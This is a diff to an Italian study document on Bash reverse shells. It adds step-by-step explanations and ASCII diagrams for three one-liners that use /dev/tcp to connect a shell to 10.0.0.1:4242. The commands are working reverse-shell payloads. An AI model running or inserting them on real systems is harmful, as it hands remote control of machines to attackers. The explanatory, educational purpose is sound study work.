@@ -51,9 +51,81 @@ Il materiale ha solo scopo di studio non si intende diffondere codice dnnoso. Ut
 ### Bash TCP
 
 ```bash
+## Comando
+
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 
+## Spiegazione passo per passo
+
+1. **`bash -i`**  
+   Avvia una nuova shell Bash in modalità **interattiva**, cioè pronta a ricevere input e produrre output in tempo reale.
+
+2. **`>& /dev/tcp/10.0.0.1/4242`**  
+   - `/dev/tcp/host/port` è una funzionalità speciale di Bash che apre una connessione TCP all’host e alla porta specificati.  
+   - `>&` reindirizza **stdout (fd 1)** e **stderr (fd 2)** a questa connessione.  
+   - Risultato: tutto ciò che la shell produce (output ed errori) viene inviato al socket.
+
+3. **`0>&1`**  
+   - Reindirizza lo **stdin (fd 0)** verso lo stesso canale usato da stdout (fd 1).  
+   - Risultato: l’input proveniente dal socket diventa l’input della shell.
+
+## Diagrammi ASCII
+
+### Flusso della connessione
+
++-----------+         TCP connessione          +------------------+
+|   Target  | ===============================> | Attacker/Listener|
+| (bash -i) | <=============================== |   nc / socat     |
++-----------+                                  +------------------+
+
+### Reindirizzamenti dei file descriptor
+STDIN  (0)  <--------------------.
+STDOUT (1)  -------------------. |
+STDERR (2)  -----------------. | |
+                             v v v
+                      +------------------+
+                      |  /dev/tcp/IP:PORT |
+                      +------------------+
+
+### Sintesi
+Attacker input  --->  [ fd 0: stdin ] ---> bash -i
+bash -i output --->  [ fd 1: stdout ]
+bash -i error  --->  [ fd 2: stderr ]
+Tutti i flussi viaggiano su /dev/tcp verso l'attacker
+
+## Conclusione
+
+Questo comando crea una **reverse shell compatta**:  
+- usa `/dev/tcp` per aprire una connessione di rete,  
+- instrada stdin, stdout e stderr su quel canale,  
+- permette al sistema remoto di interagire con la shell come se fosse locale.
+
+
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+# Analisi passo per passo
+
+## `0<&196;`
+
+- Reindirizza lo **standard input (fd 0)** dal **file descriptor 196**.  
+- È una sorta di “preparazione”: si dice alla shell di usare il descrittore 196 come sorgente per l’input.
+
+## `exec 196<>/dev/tcp/10.0.0.1/4242;`
+
+- Usa `exec` per aprire il file `/dev/tcp/10.0.0.1/4242` in **modalità lettura/scrittura** (`<>`).  
+- `/dev/tcp/host/port` è una feature di **Bash**: apre una connessione TCP verso l’host e la porta indicati.  
+- **Risultato:** il file descriptor **196** diventa una connessione attiva verso `10.0.0.1:4242`.
+
+
+## `sh <&196 >&196 2>&196`
+
+- Avvia una nuova **shell (`sh`)**.  
+- Reindirizza:
+  - **Input (`<`)** dalla connessione (**fd 196**).
+  - **Output (`>`)** verso la connessione (**fd 196**).
+  - **Errori (`2>`)** verso la connessione (**fd 196**).
+
+**In pratica:** tutto ciò che viene scritto sul socket diventa input della shell, e tutto l’output/errore della shell viene inviato indietro sullo stesso canale.
+
 
 /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
 ```
